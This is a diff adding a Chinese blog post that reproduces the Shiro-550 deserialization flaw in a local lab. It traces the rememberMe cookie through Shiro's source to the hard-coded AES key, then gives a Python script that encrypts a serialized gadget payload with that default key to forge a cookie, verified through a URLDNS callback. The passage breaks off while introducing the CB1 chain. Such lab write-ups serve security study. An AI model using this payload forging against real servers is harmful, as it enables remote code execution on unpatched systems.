@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="redpomelo">
+    
+    <title>
+        
+            Shiro550漏洞分析复现 |
+        
+        红柚的学习小站(=^-ω-^=)
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/favicon.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"rp-sec.top","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"红柚的学习小站(=^-ω-^=)","author":"redpomelo","avatar":"https://q1.qlogo.cn/g?b=qq&nk=3024951439&s=640","logo":"/images/logo.ico","favicon":"/images/favicon.svg"},"menu":{"home":"/","archives":"/archives","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.webp","background_img_dark":"/images/bg.svg","description":"且视他人之疑目如盏盏鬼火 || 大胆地去走你的夜路","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/saqy2","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"georgephillips4264@gmail.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"twikoo","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":"https://rpsec.netlify.app/.netlify/functions/twikoo","region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2024,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/custom.css"],"js":[null]},"root":"","source_data":{"links":[{"title":"朋友们 (暂无)"},{"name":"test","link":"https://baidu.com","description":"test","avatar":null}]},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.ico">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               红柚的学习小站(=^-ω-^=)
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Shiro550漏洞分析复现
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://q1.qlogo.cn/g?b=qq&nk=3024951439&s=640">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">redpomelo</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-12-13 21:46:46</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri Dec 13 2024 21:51:04 GMT+0800">2024-12-13 21:51:04</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+            </span>
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天学习了Shiro的开发知识，今天复现一下Shiro550漏洞。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p> tomcat 8.5.81（下载地址：<a class="link" target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/">Apache Tomcat® - Welcome!<i class="fas fa-external-link-alt"></i></a>）</p>
+<p>JDK 1.8 （8u65）</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">Shiro环境<i class="fas fa-external-link-alt"></i></a></p>
+<p>JDK先前下载过了，这里配置Tomcat8</p>
+<h2 id="Tomcat-Clone-IDEA"><a href="#Tomcat-Clone-IDEA" class="headerlink" title="Tomcat&amp;&amp;Clone&amp;&amp;IDEA"></a>Tomcat&amp;&amp;Clone&amp;&amp;IDEA</h2><p>Tomcat下载的这个</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212185752111.png" alt="image-20241212185752111"></p>
+<p>解压到任意目录备用</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212184741416.png" alt="image-20241212184741416"></p>
+<p>先把p牛的项目Clone下来，然后按住Shift+右键shirodemo文件夹选择使用idea打开项目，点击文件–&gt;项目结构配置jdk版本，这里使用的8u65</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212184929464.png" alt="image-20241212184929464"></p>
+<p>随后点击IDEA右上角，编辑运行配置，添加我们的Tomcat服务器</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190045631.png" alt="image-20241212190045631"></p>
+<p>添加成功后点击部署按钮，添加工件</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190209267.png" alt="image-20241212190209267"></p>
+<p>部署好之后点击运行</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190246824.png" alt="image-20241212190246824"></p>
+<p>这样环境就搭建好啦！登录的 username 和 password 默认是 root:secret</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>先用Burp Suite抓个包康康，然后发现Burp Suite抓不到localhost的包，</p>
+<p><strong>解决方法</strong>：把<strong>localhost</strong>替换为ip地址来访问，比如我这里就是<a class="link" target="_blank" rel="noopener" href="http://10.189.101.3:8080/shirodemo/login.jsp">http://10.189.101.3:8080/shirodemo/login.jsp<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212194014794.png" alt="image-20241212194014794"></p>
+<p>可以看到这样就成功抓到了包</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212195116853.png" alt="image-20241212195116853"></p>
+<p>登录的时候数据包会返回来一个Cookie的值</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212195843713.png" alt="image-20241212195843713"></p>
+<p>然后以后每访问什么的时候就会自动带上这个cookie，这个cookie很长，一看就是储存了什么信息，猜测可能使用的序列化与反序列化来储存信息，这样方便持久化进行保存。</p>
+<h2 id="跟进源码"><a href="#跟进源码" class="headerlink" title="跟进源码"></a>跟进源码</h2><p>IDEA中全局搜索cookie关键字，找到了位于shiro包下的这个Cookie</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212200354015.png" alt="image-20241212200354015"></p>
+<p>，当我点进去时候是Class文件，这时候阅读极为困难，试图把源码下载下来、</p>
+<p>。。。又出现了这个问题，可能是我本地Maven环境有问题</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212200456891.png" alt="image-20241212200456891"></p>
+<h3 id="踩坑解决："><a href="#踩坑解决：" class="headerlink" title="踩坑解决："></a>踩坑解决：</h3><p>手动下载Shiro源码：<a class="link" target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212201122199.png" alt="image-20241212201122199"></p>
+<p>选择源选择源代码，现在看到的就是正常的Java文件了捏</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个类里面有两个方法，一看就是对rememberMe进行序列化和反序列化的操作的</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212201321344.png" alt="image-20241212201321344"></p>
+<p>这边我们重点看<strong>getRememberedSerializedIdentity</strong>这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded; <span class="comment">//关注这里</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进到这个方法后，找一下哪里调用了这个方法</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213135841007.png" alt="image-20241213135841007"></p>
+<p>然后就跟进到了这里，可以看到convertBytesToPrincipals用来转换getRememberedSerializedIdentity，点进去后看这个convertBytesToPrincipals</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显，就两个操作，一个是解密，一个是反序列化，因为字节是加密过的，所以我们先把他解密</p>
+<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>跟进到decrypt这个函数里，这是一个接口</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213141024753.png" alt="image-20241213141024753"></p>
+<p>看他的参数名，第一个叫encrypted,第二个是什么什么key，就可以想到这是一个对称加密算法，是用key去解的，然后我们回到AbstractRememberMeManager，</p>
+<p>继续跟进getDecryptionCipherKey</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213141415077.png" alt="image-20241213141415077"></p>
+<p>最后找到了这里对key进行赋值，然后看一下谁调用了setDecryptionCipherKey</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213142940377.png" alt="image-20241213142940377"></p>
+<p>找到了这里</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143027556.png" alt="image-20241213143027556"></p>
+<p>最后再找谁调了setCipherKey</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143125426.png" alt="image-20241213143125426"></p>
+<p>发现在AbstractRememberMeManager进行赋值，而这个<strong>DEFAULT_CIPHER_KEY_BYTES</strong>是一个常量</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213143210697.png" alt="image-20241213143210697"></p>
+<p>点进去发现他是固定了，看到这里对这个漏洞也多少有点眉目了，因为其硬编码了密钥，所以导致了固定key加密，现在我们只要构造一个序列化的payload，然后用AES的key加密，然后base64编码一下，最后想办法走到正常流程里调用反序列化就执行攻击的操作了了</p>
+<h1 id="验证（URLDNS链）"><a href="#验证（URLDNS链）" class="headerlink" title="验证（URLDNS链）"></a>验证（URLDNS链）</h1><p>首先用URLDNS链去验证一下漏洞，urldns这条链之前就写过了，运行文件生成payload</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213145858264.png" alt="image-20241213145858264"></p>
+<p>拿出来后要对这个文件进行AES加密，然后base64编码，脚本照着组长的抄的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到以下字符串<br><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213152654385.png" alt="image-20241213152654385"></p>
+<p>拿到这个payload，替换掉rememberMe，就成功接收到dns回显了</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213153740454.png" alt="image-20241213153740454"></p>
+<p>（注意要把JSESSIONID删掉，不然保持登录状态的话代码逻辑是进入不到反序列化的流程的）</p>
+<h1 id="CB1链分析"><a href="#CB1链分析" class="headerlink" title="CB1链分析"></a>CB1链分析</h1><p>Shiro是不带有CC的，但是它有CB，趁着这个机会自己写一次CB链</p>
+<h2 id="CB简介"><a href="#CB简介" class="headerlink" title="CB简介"></a>CB简介</h2><p>CB链”指的是<strong>一种类似于CC链的攻击链，但使用的是Apache Commons项目中的Commons BeanUtils库</strong>。 Commons BeanUtils库提供了用于操作Java对象的实用工具类，例如BeanMap和BeanComparator等</p>
+<h2 id="什么是JavaBean"><a href="#什么是JavaBean" class="headerlink" title="什么是JavaBean"></a>什么是JavaBean</h2><p>JavaBean 是一种JAVA语言写成的可重用组件,它是一个类</p>
+<p>所谓javaBean，是指符合如下标准的Java类：</p>
+<ul>
+<li>类是公共的</li>
+<li>有一个无参的公共的构造器</li>
+<li>有私有属性，且须有对应的get、set方法去设置属性</li>
+<li>对于boolean类型的成员变量，允许使用”is”代替上面的”get”和”set”</li>
+</ul>
+<p>在java中，有很多类定义都符合这样的规范</p>
+<p>比如这样一个类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> String name; <span class="comment">// 属性一般定义为private</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  <span class="comment">//读方法</span></span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String n)</span> &#123;  <span class="comment">//写方法</span></span><br><span class="line">		name = n;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>它包含了一个私有属性name，以及读取和设置这个属性的两个public方法 getName()和setName()，即getter和setter</p>
+<p>这种 class 就是 JavaBean</p>
+<p>用于对属性赋值的方法称为属性修改器或setter方法，用于读取属性值的方法称为属性访问器或getter方法</p>
+<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span 